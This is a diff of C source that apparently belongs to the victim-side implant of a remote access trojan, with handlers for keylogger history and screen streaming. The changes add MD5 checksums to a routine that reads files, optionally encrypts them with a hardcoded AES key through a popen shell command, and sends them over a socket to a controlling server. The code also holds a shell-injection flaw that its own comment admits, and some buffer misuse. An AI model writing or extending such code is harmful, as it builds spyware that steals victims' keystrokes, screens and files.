@@ -52,13 +52,14 @@ void V_2_S_encrypted_message_handler(main_data data, action_type action){ // vic
 		case GET_KEYLOGGER_HISTORY :
 		case GET_SCREEN_STREAM :
 			strcpy(encrypted_message.data.file_data.file_sub_buffer, data.file_data.file_sub_buffer);
+			strcpy(encrypted_message.data.file_data.checksum, data.file_data.checksum);
 			encrypted_message.data.file_data.end_of_file = data.file_data.end_of_file;
+			
 			break;
 					
 		default :
 			break;
 	}
-	
 	send(V_S_socket, &encrypted_message, sizeof(encrypted_message), 0);
 }
 
@@ -66,29 +67,34 @@ void V_2_S_encrypted_message_handler(main_data data, action_type action){ // vic
 void send_file (char * file_name, action_type action, bool convert_to_base64_and_encrypt) {
 	main_data data;
 	char sub_buffer[MTU];
-	FILE * base64_file_descriptor;
-	
+	FILE * encrypted_file_fd;
 	char convert_file_to_buffer_commend[MAX_FILE_TO_BUFFER_COMMEND_LEN];
+	
+	char temp_checksum_full_buffer[MTU + HASH_LEN];
+	char temp_checksum[HASH_LEN];
+	strcpy(temp_checksum, "\0");
+	memset(temp_checksum_full_buffer, '0', strlen(temp_checksum_full_buffer));
+	data.file_data.end_of_file = 0;
 	
 	if (convert_to_base64_and_encrypt)
 		sprintf(convert_file_to_buffer_commend, "openssl aes-256-cbc -base64 -in %s -k %s", file_name, AES_KEY); // there is injection variability, to be fix
-		
-	else {
-		strcpy(convert_file_to_buffer_commend, "cat ");
-		strcat(convert_file_to_buffer_commend, file_name);
-	}
+	else 
+		sprintf(convert_file_to_buffer_commend, "cat %s", file_name);
 	
-	fflush(stdout);
-	base64_file_descriptor = popen(convert_file_to_buffer_commend, "r");
+	encrypted_file_fd = popen(convert_file_to_buffer_commend, "r");
 	
-	data.file_data.end_of_file = 0;
-	while (fgets(sub_buffer, sizeof(sub_buffer), base64_file_descriptor) != NULL) {
+	while (fgets(sub_buffer, sizeof(sub_buffer), encrypted_file_fd) != NULL) {
+		strcpy(temp_checksum_full_buffer, temp_checksum);
+		strcat(temp_checksum_full_buffer, sub_buffer);
+		strcpy(temp_checksum, md5(temp_checksum_full_buffer));
 		strcpy(data.file_data.file_sub_buffer, sub_buffer);
 		V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
 	}
 	data.file_data.end_of_file = 1;
+	strcpy(data.file_data.checksum, temp_checksum);
+	
 	V_2_S_encrypted_message_handler(data, GET_SYSTEM_PROFILER);
-	pclose(base64_file_descriptor);
+	pclose(encrypted_file_fd);
 }
 
 
